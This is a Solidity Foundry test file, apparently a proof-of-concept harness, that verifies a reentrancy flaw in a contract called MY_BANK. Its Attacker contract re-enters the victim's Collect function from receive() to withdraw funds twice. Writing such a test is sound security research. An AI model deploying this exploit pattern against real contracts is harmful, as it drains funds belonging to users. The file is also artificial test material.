contract TestReentrancyMY_BANK is Test {
    MY_BANK public _contractUnderTest;
    Log public _log;
    Attacker public _attacker;

    function setUp() public {
        _log = new Log();
        _contractUnderTest = new MY_BANK(address(_log));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        // Constrain value to be at least 2 * MinSum (2 ether) so we can withdraw half twice
        // Upper bound prevents overflow issues
        vm.assume(attackVal >= 2 ether && attackVal <= 100 ether);
        
        // Calculate withdraw amount as half of deposit to avoid underflow on double withdrawal
        uint256 withdrawAmount = attackVal / 2;

        // Fund the victim contract with enough ETH to be drained
        vm.deal(address(_contractUnderTest), attackVal * 3);
        
        // Fund the attacker contract for the initial deposit
        vm.deal(address(_attacker), attackVal);

        // Fund this test contract
        vm.deal(address(this), attackVal);

        // Setup attack: deposit into the bank
        _attacker.setupAttack{value: attackVal}(withdrawAmount);
        
        // Advance time so block.timestamp > unlockTime condition is met
        vm.warp(block.timestamp + 1);

        // Execute the attack
        _attacker.attack(withdrawAmount);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    MY_BANK public _victim;
    
    uint256 public reentrancyCount;
    bool public exploitSucceeded;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        _victim = MY_BANK(payable(victimAddress));
    }

    function setupAttack(uint256 withdrawAmt) public payable {
        reentrancyCount = 0;
        exploitSucceeded = false;
        storedAttackVal = withdrawAmt;
        
        // Deposit into the bank using Put function
        // Using 0 as unlockTime will set it to block.timestamp
        _victim.Put{value: msg.value}(0);
    }

    function attack(uint256 val) public {
        // Call the vulnerable Collect function
        _victim.Collect(val);

        // Check if reentrancy occurred
        if (reentrancyCount > 1) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        reentrancyCount++;
        if (reentrancyCount < 2) {
            // Re-enter the victim's Collect function using the stored value
            _victim.Collect(storedAttackVal);
        }
        
        // Set success flag after confirming multiple entries
        if (reentrancyCount > 1) {
            exploitSucceeded = true;
        }
    }
}
